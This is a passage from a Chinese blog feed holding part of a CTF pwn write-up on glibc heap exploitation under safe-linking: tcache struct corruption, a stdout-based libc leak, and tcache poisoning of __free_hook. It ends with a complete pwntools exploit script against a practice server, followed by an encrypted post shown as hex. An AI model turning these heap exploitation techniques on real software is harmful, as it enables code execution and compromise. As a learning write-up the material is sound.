做准备）</p><p>自己做题的时候，这里肯定不是第一次就能写出来的，等调试到后面发现这里需要构造 <code>counts</code> ，才拐回来布置的，包括申请的堆块大小为 <code>0x40</code> 也是反复调试更改后确定的。总结一下就是这些数据都是调试得来的。</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202035978.png" alt="image-20230320203552375" style="zoom:50%;" /><p>再次申请一个 <code>0x30</code> 堆块，这次发送的数据全部填写 <code>\x00</code> 即可，此时 <code>pthread_tcache_struct</code> 中已经残留了被切割后的 <code>main_arena+96</code> （如下图）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202041239.png" alt="image-20230320204130712" style="zoom:50%;" /><p>申请一个 <code>0x10</code> 的堆块，写入数据为 <code>\xc0\x16</code> （这是 <code>_IO_2_1_stdout_</code> 的后两字节，不过第一位需要爆破），写入的数据会正好落在刚刚残留的 <code>main_arena+96</code> 上，从而产生了 <code>_IO_2_1_stdout_</code> 地址，并且 <code>0x50</code> 这条链的 <code>counts</code> 已经被设置为 <code>1</code>  了，所以是可以申请出来的（如下图）</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202045688.png" alt="image-20230320204516358" style="zoom:50%;" /><p><code>io leak</code> 就不说了 此处<code>exp</code> 的代码为</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>具体做法请参考 <a href="https://zikh26.github.io/posts/a9dd00f0.html">文章</a> ，现在我们已经拿到了 <code>libc</code> 地址并且 <code>bins</code> 的情况如下</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202052487.png" alt="image-20230320205222092" style="zoom:50%;" /><p>申请一个 <code>0x10</code> 的堆块，写入 <code>__free_hook</code> 的地址，该地址会正好落在 <code>0x80</code> 的 <code>tcache</code> 头（如下），<code>__free_hook</code> 为什么会正好落在这里？   别问，问就是布局 ◕‿◕</p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303202055913.png" alt="image-20230320205508486" style="zoom:50%;" /><p>因为之前已经将 <code>0x80</code> 这条链的 <code>counts</code> 设置为 <code>1</code>，所以可以直接将 <code>__free_hook</code> 申请出来，然后写入 <code>system</code> 地址。然后观察 <code>0x20</code> 这条链是没有任何数据的，我们就可以申请一个 <code>0x20</code> 的堆块存入 <code>/bin/sh</code> 再将其释放，即可获取 <code>shell</code></p><p>本题注意的几点：</p><ol><li>很多看似顺理成章的布局，其实都是反复调试出来的</li><li><code>counts</code> 为 <code>0</code> 的时候，从 <code>tcache bin</code> 中申请不出来堆块</li><li><code>counts</code> 大于 <code>0</code> 的时候，如果里面的值不是一个合法地址，则申请时会报错</li><li>为了打最后的 <code>tcache poisoning</code> ，必须要让每次申请堆块的 <code>size</code> 尽可能的小，这样才能让 <code>__free_hook</code> 落在 <code>0x80</code> ，再往后的话因为对 <code>add</code> 函数中对  <code>size</code> 检查的原因，就申请不出来了</li><li>往 <code>pthread_tcache_struct</code> 中写入数据时，尽可能的写入 <code>\x00</code> ，不然可能会破坏某些 <code>tcache bin</code> 的 <code>counts</code></li></ol><h5 id="EXP-v2">EXP</h5><p><a href="https://zikh26.github.io/posts/ad411136.html">tools源码</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;pwn&quot;</span>,<span class="string">&quot;node4.buuoj.cn:26738&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">heap_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">edit(p64(((heap_base+<span class="number">0x2a0</span>)&gt;&gt;<span class="number">12</span>)^(heap_base+<span class="number">0x10</span>)))</span><br><span class="line">add(<span class="number">0x70</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x70</span>, <span class="string">b&#x27;\x00\x00&#x27;</span> * <span class="number">0x27</span> + <span class="string">b&#x27;\x07\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">3</span>+<span class="string">&#x27;\x01\x00&#x27;</span>*<span class="number">1</span>+<span class="string">&#x27;\x00\x00&#x27;</span>*<span class="number">2</span>+<span class="string">&#x27;\x01\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0xdeadbeef</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\xc0\x16&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#delete()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>,p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x1e4744</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xE86</span>,<span class="number">0xE6D</span>,<span class="number">0xE5E</span>,<span class="number">0xED5</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add(<span class="number">0x70</span>,p64(libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">delete()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303201357465.png" alt="image-20230320135639350"></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Safe-Linking </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序实现单链表上的一个漏洞</title>
      <link href="/posts/378831b9.html"/>
      <url>/posts/378831b9.html</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="74ca7a88ebb6154cded2df421d283bf5d1bba856b82051bee083f91958fc033c">0e96a196e04ab582d32680aaeaf05fdcdf197277fa4468e51c98a6189f8f162162cc8cda35bb8442d3ced35bab02c59a0869a8472f83cec4d4675d54a25b767b0483f19c3dea62baafd7f856007691633ff93fa5cd64d3d9875bf87fac3bd77d37c83c53fec01505fe5f039d1ddd02996957a9ce613a6cb5b1e641fe2e1ae841a8b4b61d47861bc3ac03023a3d7f128a8a2ceb18c732856ce59e45c2207a5e229176447dfd1406609c000d616a7aba579bdfe268723cb7b9a16d0a6e75973fd0b232626a30788e4f499b40990918d3896e560051662ece8f8f673488b9796e0222ab8926ccfc436d1f9e2add494c7aa49fe3443e1f3480aa4ca02e465b4b1ac69c79b934d220f56b79d6952eacd869ec84b1876d682c2a363f772e31c59bc18323ea37f706ee21ac80b8b0ca48aa96cd66758c9411b30d886689837f791768cac9fa43cc706f900e124381dd1db3af876fdc673e116ac1e2f6447ededba513b7eba76c4d25bebb8b5c986c4c0f270fe579eada822890484b39a52469dcdc8285acbf00a3c893a8fce677cbe954ac7fa5fa1fbfcfe9ae321ca79a71070a20e14ccd0242d4f2ee2b62e760f4e8232c1789da63a4b9b385b2ebab01bf5b374ad9e4e6eec58f4373d867820a7eaaf3ab09ce53687cf79e2ef9534201a4ad9b50a455455f8946ff8738d55c6d70962e2a2aecd0cf42411588496cffbd257085c7c9c6ad1fbbfb7b9ddc79bc2cc96ef63708afa6770e68fb1865bf95341b77c67dcdb646451831955e6b94c29ff972971d5bc85af45951bf92aa24bbea6af21bc8c3ea21838b8700f44d0317b41521093f374450c2097de2b736077843bff1516ecf5067dc8a3756394cf79f77b1dcc511e504b6fd64cef1a61ad994538302720a5582325410b1f4662211b62709a7a1ebf71388ea18b5c1b9bbdd7cdde7e92c6e67b5d32090c9390fc39d8d6d400a23febefeafffcd327981cf3bf74abea3644cf1fc6a13702d8209481897ace7ea1ae663a861867df0fa4c8dafddeb6a476710e70709af217b0078c6a051e2ffceb1609e9400657435bfa9c26aef177a482470ffdd3b1f1e882c67631de34cda3d1556116b17b942d7b373b4fd196aa7cc86fb635982eac8e3491a0704bc6eb1ed5033de14ad77dbcbbab9fd95765a8dc85ad003f67e4e988351582dfad7157cf4470d2aabe4591980e181e5f323eea89eaa0e5ff78a286ed6a81baec4ac12a81ec6670f6e70f2d9fe19ec824c423ba5036cd9365062b4eb6d292ac35a7df3b4075bf7cdd1c44fad4b8b35ef1da2c998b72fffef0b7705c3e3ad6cd22bc889f30c681ebdd8c1761341aa37c8fc7ba49827f96a3d3333b225f52c647e3b1762d849cea806c548995e52322ca1235c6749ff4bfbbf5d206eaf84a27839b29c73c869d59dd618261589cf85d72a3102a6dc0a564b1975e9a768b6d1c616f97682918741abd8f18438430e55b8602ea1bd64e68adbbe812c7f7e800af950ede03d7bb586a77174fb98e522e534665e64b587e889a8bdb89fb10d6c22cbbd1d55be5fe9a97dcc75aadcd2dec88d1a60fc2647c0e9350f4b3a1891859abfdf9eb498009f138fc32b962c10f41494158e013fdf8f9d99e54f05633d7a9a036ea64d10951c16f940bb95ff34f35507c34be36d8f3a925ba837b0c67afba129cdc4a57915d88ecbd48659a35c6fa03d8b8414a9183948f65c52b5f3077fe97c03f74dc901093494f073f5160a882f60741933f0769b9340760863f197b817ff2c8b1ca6aa0923f1298ee04230c3663bb587d47cdd6da50428817e848d219b6372c88d39ecd42bf118183d85aa1a34ed41c2d85574dc8b774b022db6771306e82f856e43943298934daded620cdd982eca5085e931f5b91e96668edad1b5aefa180cadb26e9d02e47960a020a076900dec9cf5d8316b488b2ad8e5fd70fe5b58039266efa8c20a2259a74fa04055a01273a361d9c106620a22effb824af83abc3dcb017861f412db52b38d934e575f9423a981a1ebf72863d92aff1911f33c8a9ad9bb7a466f673518a6ddc8639fcb3a0c782390fc56a3f28ada99ece5f6aa59da6225377b4ad2d2be9d4549702c5e2760796d1ace72eae5f71fe9fab56cbea6aa2bed84f6c5d1ec7e91ca5932f55b53eca8655a0aa18c2c34233a5aad0fdb76e56e81075ee4b206dbc9ca01f44595f9a230a41618ec2db6b15a15a7a6f3fdf8c88576eab7a7616fe00742430ab72e20d9690a16be100941e7a786ad6365bf8f0bb76be585ca74291eb17468b71d37e97087a06ccb7d09fa28f4e17de607881b54aaa636a623e938586da2af9329b3bd72b86c6eda606325307863de463b810e5643c9d080d63b16f59a262d84cd4cadacd9ace11c321ececd19edff3c30e43aee9ab160bb679d41c71f2df74733d59764cba090d578daa130284c8415b2b14c66fde2ce1fe5011a3ee7715c0dc8d17dea6d5a9f9eb7b6497a1e00571f2cc90858889c91aca4845d96ab1c73515ad7949d25d1761aae569a4564ca6d43d458d1ebe9e8db8f3e47940006cc0d29343f0195a120f9d26b150d1e9cb1c01541ecb9e5f2c3a82cd1e8e38f24c5b754e70093d242c0e9f2798c18abc007955a4b3936c252b60e92781ec4e7eb81a84440313ed8ad45b29d8aa9a5986d5c2a8607cf2bb38ee11b157f862d8658aa821b356cd02baecfd58eee1c8f7c1adb7f659a593eb202a935edaef42244fc2964c02d1ce75c3f54fb05963436ccfda9cb6ddb652907a329d0e8454537538c9cae87542df6da87848719d620ab67061a49ebf4a8e8df9ffbc8ede027842363ac018218d27a5846bcf61883fee24cc00607cd5b5c6a935078676c1a581320657ec2dbd3f091a27a6ab824bbff1937fef0512a7043198be3d487f8a5d03878d6ed8096c68540c54db46ea19a33d28c6f46a90886088d0233fb50c4f34454275dd0389088dfacddeea34715f2814601ea07671e7bffc1f24431c3f4c284ca8384c364f3d00ee4e102b36c5044fc130f87b227a488e1337095031ee61274aff82fe9615c80e436c798ab3a4bee53000b552cf754ce3301bca52ba91f2d23f1dd954e2e7d8a592c4072045652c8a2f73888f1c25f10a23121fa04b51be5ff2374b6c7a3324b69703369b71cdbfeda562cf6ab3ba815ea7c4e70d0775ea85f84719c464db6d7170c4747602fc8a6a73e3777840cb7faf8946af2cb8e4f6ba66d05568211a65406f0545bc12a92d5f1ba3985f5f997cf7e81abaee0affbca5b1e540eadaf5d64e4c03aee82660739a09c00b6560a53d423e9bc82ad7cc0d6b5008e4789f13cc71368f8698e3dcc4e51dd5d9adb122cc2bb13fd9cc0088f6b0bcd5ab2a1b7103e6ef1b8eca1b973b9eea597c477a1ca57b6dc9d4d1470a27734f7af2de0dc48ae1234dd7e34a4fdb61d2e73649a3f633025c9453be7df8dd1d143b022a31d59553df415d6f788f58d24570a27914d44ec80cd3e7de4db4e48076e86ffeb7137ae1723741c1f13572168327bbedd6b0832182bd93bd3d69aed927117b844a691d82340c0e164976727cadfb775780740b943f52de01e208ae8b1b4d8d7a6897f8a2749add0f267ec1b28b7d47769b8ecd6e0086ac58adef9a74ce06edd8f41f28125b7bb27eb709f5682a7bd48eb0d42d08cecdf2231244349592de216642d928aa21a6d4ce1f48016cf823957fa1b820e5283ce1b4e01f2633cc4577c6561790431c31f5cf4b0cb690754d6c9428084ed0018756e5761c7c4e98588455a10cad2e05ce87775fe5ef9d1d1e6663ea96e9d44f16f66749f0c17a5c99f4e07722ff3a2558b6a8ea115161f80ee901e2d3e6225c55c76f05492d28e939102b9c99249edc556eec8429ff3dcb9f963c6521c4e5ed4e7f5fb8dcb6bcff253f1d70f1bbf5512c2ff61c50025af7d95b5da38ade6fdd4c7d654666671c22e7f1821d306b34e85d7bcb3354a6204196d7fb8f4707b502c39d1527ce36d2140f968fae4312e5217bc0cd76f31b55851753c43ab18a2aedbf6ddf50f97578f0664541dbfecd5ad155bd0824caefe1186de8577de688077abd82d03a4d77a4d04223fada33e0e39905870ef9838b62b00eb2993a13227ed9b564c73fe4266c28050c5364ba8ba17124747794b4898fb1c7cdb5362e3410a8e50989c35f3e8fe32084476d08db898646e45edba7683102acedab32dde624556a9d85d9bd592d20b5edb07971862faa669beea928c29b6540dba228caf40a53b93690621cd3b4c87f94c0d0cdd2b5b9c03c51fbc7a877eac3bac8a47ad909602be1b90fe186cb45ab1e7e8cf997fdf78fc407b62cb2f740e126f75f7a72302456a494250c690da009aaa205e438db67aea8ab1a1158a9dd036b9170c48085cba96dc894e0f2c7b5a319ed0ce5099f708f00ab8c95b92b8d5e922dcface4d4ee4dfe53224298ff42eeecff1d93b8e310d9d7a48fb6893011c92fd9e22938cf5280d822587c2ed3ea5e1c105de4cc8186d65fcd62e357249031f0452d37b61fcc73c83956b8827a2391c275b51736d6627be83a84c9c93c0736b7b08717328a96bfc98dae0553a484e7cb56f899fa00cedca7f10b8a213943e5ff28350c3805a168744f515ef1bfe625c1f57654f4f4c9a893809549100d9174aa65379b2b5bc41e41910e1edc7e3ae099271ee1bc94a4fe5d9527eac5bd5a37da98cc8fa21ed6c73b11b831c28a1d92b2dbeac6a69ec3196b13b22140e16f4406692fe2f0f333840d036cdfe23f2fdcdcf521d02db17bf913b87b3e035d34121827d331cf08c5366a8870de95060ec73506fd81e7447ad641f63eb7f836f40893db0dec58b6ef48f3dba573476ee98d7c0805c0f0c58ff097e59ca85b90274ef82a655475bd59c86fffb1aa11abe91c66ec02ecd04d672e16ec020db93818bca91140a4338859feb2998d831ef36c8ad17c5f5d7c73d7cceff5ec863cd0c069527a1b48f954b60d5ce8577b52e38546ad4a2b1fb6712284233bc0dcf3832c512756e926f904cc09bf656d718f335369bd10d645d9f2dab491673411aba08fbcc477263b719c6ea530a947ae2e38c4ce55f78535c536d34a15ebe8b26b87c94f143370c2c5a5bf67f9f07d6e8c69a13cba2023825d2807bf724c7913766428312f4c15c8d8bf9e86bed9fb33559f6bc94dfb0ff7d7be64c7c1a7cf935686ed2951d4493dc9b73d81cef4cd7e2a455ae5900cf253c48c23f7d4cc7ff18db5cb03451c212d4baa7c69dcd9c7618386289f1fd0f84fee2dbc0b0af0d97f3998996d324066594fc7912142cfae77ca6d82511d64d4e5244c7ca77c41c7199dae805c8df97115cbe43f169f2a7f925fe08983cdcde06355cc3edcdbd4e8b203c7d84167c206a280e5591823ce28d39e14df9400fd067e0b8899cb6e53607e813a10d5f4946553a81ec333837baed6806fd91a04481a96ad2e0ff27bdaa64c97c1c8fc90e4b60c3144b0a6c56fe3055e8034a23f51aab2d3564e784253397b24603c05c2745212cc1f923461d43102e68e4580caaa4db1afe382cc13c2b8ad627368993f09d4189fb644916ad0609f2a387cf146d65f1776379edb12e045c4610cd43ab4a7f0b16c7bbc1972e393a11b16ad5eaf2b68c2377580e8941c2dead7beeeea3eca724ce4a6864838e7e942a804f5df9fe182ddb379decddfeca6f6c4e33d7c4ee88b0738d474b5393c7f5a59ab41e9ed748053b11c02789a6e3c665d451efe952314365832db6077207fad59b9eb059e547ff588a68a01080bc6efd27b9d5343010557ba6a11cfd617d4994441b6995d0693b1b4f4850743aa57485bbffde82990005ae8daca993694e83c36fc3541b3386cf8bd8b7d51c4f67d0335ea2edb64c69ad1f2e0d3fcf91f5534c5b5d6caa54d70d11c3dc3fbc198f9c2128f880edc67f6f3cfa36aea20a90ada871a51ec7b225bcd354f4d47f117b1d03f720d8ed991fd4dac06dd6f69ca6c9411aea265562dbb44ca88027b93f46ae9302534a912a0ab5345824ba65dd7c6729f6956c5e87e9b155ad01c116a7e824640d69e0c46c3564dc67daea17734be1a3de2b52fe505ea7ab20e2115a9c4e812033f90b7cf64ef38501abaf4e4530f5cd8653d0326f3c4914240f8561c3a43fcf2fa2d52ab3c0ffcabd6c8e70ecdc54ea0f6c28c0ace7140dadb76701f2880c142abd91091c843897a88755b35cea993ba58bed83bc495533734c6ea03d6d9f3d64929ef0ae401de5f11c966a4db9d3714d49bd436b66bd78370dd934f82cf65c893f3826fc7c8d0dd70abaa357afb88736afd2d8ff2533cf6583172e2a5acf3bc113910480a278f3e8f8398bd20ced9038fd619e034bfeffba71e259fc0483dd8d1a9be787d338482af148e493bff6d9ca80f82f20e55ad2923e5ea7d7ba2f42e5ec7fce123ff22e4dbbff9687bf0120292fad5f47d3cba2baba780104ce40f4cf4fd7c7da2eac136cdfde409191b818bf92e43656a0a47452d3a439ce6851859f6ff653fa38450e47dd974ef850ffcfc8a8ce78ffb074b5d442634cdfe898b48154af0f9ec0ffb152f522ec92d9970a3151b3356918f44f66e45a1b47ddbd307a6395adef9a3d198e76f103a37ad26a27255659080da95dc68a422a192c49c4df2f8a078ad82ac0d6a357934877c9fd6369f35fcbd2ec9642f3f9ebacabd30ea1c9a5ce8d5678b280d0ff5d000394dbb58cacd81b26ee0958a1be91162b94e454432f5a03bd1666f5b3fca2a07d29e5a8dcff0806b5c86f2e9cc073657690d8739af4bb050e4a7fc7ba18a018ff4afa0e2b025c81d74ab017c001ec793feb69071fa875376d697c306aa92f1dbf6a1ea57c59fd0e3879bbd572ede8072c449e5c16a3b93b940d8123945c35272ecb401dfd6a3b9fb2d7783976d60b673d1a8fabe17e48b0730d5b48f9882d41ab0de45adacdfe5c715ad48efb9a20d0c71425611def3c03ec1b361d1b30a8df980450073753530920d7a1414f57033f7ee15d8c4aa51c1018dbec5559c8cdcb3e4bcaaa4580a324eba40ef87f2cf09862a91ab910567d25ea78f8b4e453a499359c8c12a2b12a6c317ebf60c441a0465591bbc0577c87d58f14a273ab458b50bb88962581720d8245a8fab6a03b3f6da9bea8cbaa2518b86fcb548549b0782b16f81f9375335181433792e9a51f8f3bb153a2cdd4ea4e57382d179daf708a2434291fb104d5448f998348fbb6f3f58f021f4c2c552dc129425349d0951a9537af7c5b28a6e5eed923ad41c18a31308c886b78bd4a32331540ed2443c56cfada3ee2ae688be2e52102f26b08282d75f04c11c3f14b2d4f44b29af34c026558a28ad1318ea6097933e3ba9002f35b204697ddff6cf0b713d619a545996e41e05a5a2a6f7bbfd40f257650b633538c72a1ac71f0e573989420f6569eaae4ae52e20d8eb47b7acebc7c78d119d35d069369b0e64e146616d503a0281d30682054cbbc1b7b42e88d6e5a6f996cff3df2bbb32cd82606fe1bd91b245572b5ff966854eaedabac3e126feacf2dde51f953e9dc896459ffbf0581d35760b051863ab3e073adaec77300c0a98dc9df3b98f4d4846650ea0f0b8d7faeb809048b0db4e46162a385e7f74868a30e8daa44654f6ea8690fd1ace97f85afd73321e73f05e9e1a047ccef99cb9c9a581c59bf31dbc8fe3ad401e5ba180c1704c71b01666f86bcf8af8d789968559bb9188576e46ef4f7fd5796666ffcd2cd1735ae0e53bb3bb570597e4b9de0e9186d1c530b4b22c93c4b7f9fbdd9fa12c5d03ce9ebb4318e62f5bb59af2933630cb664bf5b8d1460758686f90e510a7bc2cdb3f94c58cb9e78996a6cc6bcad6a0ce6f8092ddfc0231306401bb838670404fbb2164eea81b03e5dedf366f4683517e37a822b0ea5b68ee4e8e402e8e70b483ba144242622fa8963448d8cfc9ef367f43ec5b4de222b2242f250c62e423b64d7ec20dfc5dbd3283e3d63551eee26a20df9e4d6b819640b59a90cc9890b69cb5ec6329c56b7a6f4320565923da0dcf57ba120007a508d5e88ecd0796fcdbfb8f2da23ce9e55ef6815f73c01b90b629a85911a0a94516d01e16de0e79c817c5a3ce16ae739b49d38580eced62aeb4903a8b6bb96f006b2fb0efe26e91a766bbd594f7f7dde313a56332a0015a3869f1d3b718e72373a4e8755c7b9b27e4fb8bbbc505f73b4847911437fe9373c9c3017cad58a3b5ca2a59b16cb5068b30402a7446d4424e920be217a2ca5b8b99db74466c4a4e23734ddb65fc02324dc9e7325dc2bb50c42be79808b8c6f40196d84e0d3ac69647f2fd74f1db20f77eca8c4f6a814200f103368a1ff4df8a78a0c50f87b57ccad8fc2df503daa92bb6c945f3c0eba5fc9320136569dea4e772aa30c920862dbf3f46333f45719c4af29ab3ad521954f6aa64bfd1e5bc764268e810ccc3e1db747909388f5649f3b6c20130b25787e40b67139b18cac59cbcbd061597d862f6a5041cfe39fd7257605d433163d9c4b66ab60e9c4fa47f24da83890a11cac9e7880aa22b1056081d8e1cdba0d32019925167fc972f597db7950175d4fb09c9e0788d78c5065b14a8de7ae3bea6b6059dd1d72d4dd3146d88d9080d71cded307b22cba25223fe97ba3cf8ab6069c2ee7227bf99902eae718e4e88a631304552e55eb351cabc2b30503634822b9f4214470327a1e586073abc6b50a7a66683fe7a7b512f51e2fbfd9140a9856203e64501a70ec77fd22e8762998a19a28e85635159535e928dbf08b39300cdb75b99ba92a71ffc3b8fac33ec49bf28e7b9c1a4644738b12c79dcc1d544bb9c718389986505ad5a28dc73973892622c7e32c8af0e1bb0cdb67f86bd11d53935409b05b3bdb6c15a02f7517e5e6ac2c8daf5bed619aa5df78a6cf383d06bb055f73dcefed05b9e15b9020e22f42eebb3bd3d33525263b71db00532a77cd3252fd7415846b9e954441860925a9f18fcd0ccf1b59836f92ee5967d4e75d582a7967877411eec7d1398b65acad317fb906380a09d5012d3efd9f34a4d1ee2fe4d9230b0e848bf67985236565ccbcf6f9ea2f65c3e310b913f8b330a9c2e746fc8a8c989cd34af61516fc8bc2fa0e5400444c32625ed6824330b89dabfd98513b84434f55144d3d4ebc410897f52efd25b6c7e3c6bb573963573fd5f9fb49245d38f67233829e307cef55f77076b848f0d34801996bb0cf78d132264af792382f611e87c78b1bc8e75ec23c10a0f9bc63c9c20dd77bf006c6cedccbd749effba14715c01733b0cb05f1439944ce3604b1b7fdbf5b3e3fd267334319e56965da04fe37f6e62ae74b69635fee58e3f17b8c0b1042bb3b74ca85d1af09eeb1164d5269707bdde5539650be578f1d410aa97a3ac8c360c21fdc56c92d10be35c2d0fd22a7158d1599f56c727ced8e7dd0fbd6812ae97879570318fb345d3914a248031668af09705b38d6b424d09aee3aaa0917873d9398589d9fb8af3782f9212139210a35a35e198a559bcf407df6e0597cbacb633e2a14de6662fa7f5e5a1d7a89d17184b6ba8854d19ffbc4feaec397629a695a0488f9f2b0c12e863f1afda371c071de211707dc65c4f5377b2d48fa79cb8ff3be0048516f2bd6f7f7c0b5681f8e5a7867070d0096889379274e817deab51fe6e03ed34c7294736b7c1574b6ccfc5aede5803c5723e5309a65e670308bf36331fb960353a37ecc359138ecbcd71ae02dc02d56881232cec58bc3ce6c40c14d1fc319c9330366d22e6c07cd7902d10b667666e5759b1f4bfb0b7a601921165c81784b2023cc1d147642ca75631754c955b062d4d36348d85330be7a0b1eb450514063ec021bafff05466be452cd9a3286ccc410b5fee4194576855accb18dcd28ce7a2e75fbe4441f39ec5f0a053be9fd4512aa3fd853c5fdfed2bc3bf701518a259eb2caeca3295cb6b807d764179517ae82dbfd32884edf5b8417de7f287ba1e1048ff4acff412e31709ab8e0c15cc0fa50fdf25834fbb7d3842dd311f69d935412050a38329eba5770ff76d7ea2cda7d4159505d6583332560e1138954536bf27dfea58e2d25611fe4f851f83e1265a4548581a9d5bd1cf371341c9ea4842426bffa1730ffa8050e36c479b6289d2962428b08e18d863d43baf24f14126afabef72b5a482514c6430773fa82eee192f301f5a7d7d926215ea646b363a8300dca009eedad0b521aabe37f7d6426841554859dce1fc16faf8a515bce55f6871af1977d88df85b35b7a598b915fdc73260e9d92679b0ee7d6c99c741d128acbed3679a38d2953529222411304826cabf19e7b1e2b64f975563e3a0a7523bcb2775271ad1559b909494f568df638e96fd991d362bf41ab2afa051554e32397e455c6a708dbf0c4181940891e99816d2797fc8e6d9891ba7a9452eab71ec830e0518b2cf2f55c787b0e17a801548dec9b49135273c47b71832b0a8ec7bd176ed21a558f8d700ee5f1c5ef9649829cde8f6273986457c619d477959721e4b038afac275d45133b676a1638fe16e71af6fcb915f839600eeb17a94328c0e3b43df7d9979cf1c29bf9e4ab650c006c0bea6d8a526c07c2ffb583a903ec7a796842f6e4837dd6f999e58261da62b712ce80449225e57139076d2b55cc77d03233b4daa59455e05439af9693ccc2457d25abb5015b6f9ad088f2760456ab39bf9be569b3cb92486ac829a764ff6479965656acf5afb29250eaabe64185fb90f6a52eb621fe44c1cbde03c498b0a374d4b7072d2527cc282c8877c4c30dafa0c7938f27b49a3a50448421c9cefe936e0c9a51586bd4450883cffd2a9de8c6bfe5610b1449d642a2d954ef7ad3b46f61ec0387a8a4ba21187becd562d42ab5a5bed94e2ea750690465587c9db21b5eea2a51cb482782bf60bc66f675b5ca209e8bf02fcc38c966e2b0f93829f8265f00ab02c49a7d6ae7cf461e584f7f76e8406c8a3459e62e142f82f84bd5139217aac51605c680857339fe1ef6bcc874fdca7517bd822f62eb7eec21a905e72de6dec8df55fb8a0bc275afa816959f61b197a525661f9d5806a3b47161aa72d8d1e512babda21b3456632f456ab23033c09fbab542c2c3af68ac1489e44861b8bd1d9d577817f621ce09e582e4dff34b0b6c539702d2381583e145c85d336a3636e42ecb599361a90cbf18cca0c41d44e14285c5e1d48a842b829afaa04b6fd41aefef4ac41a1079d1097cff147e38ce51fa109e76ec0bbb5ab32a19553d743b6316eb7d2d415e1decf30fd7e8c59a7df8cfcb2662242436cd17bb2f87e6430709faebebaefd000d525b650770b6d6ed826552be746707f09534b5734145653e23980e1f36898f6733bf76a01cd8b5f3f7eb1e089f7b0bb36ee4c02149fae38f11bedce5dff1095e82979dd4b32708d9c7cc27cf685220a766bd36a70057623afe8c981a2722daf2881b2eca3c46f04f695d3c36e76b2f4e1704b9c7231521cc4e61ba715b70fccd217701adfc52464d17dd1af0085cd5fa21b6dfbd92bb18e8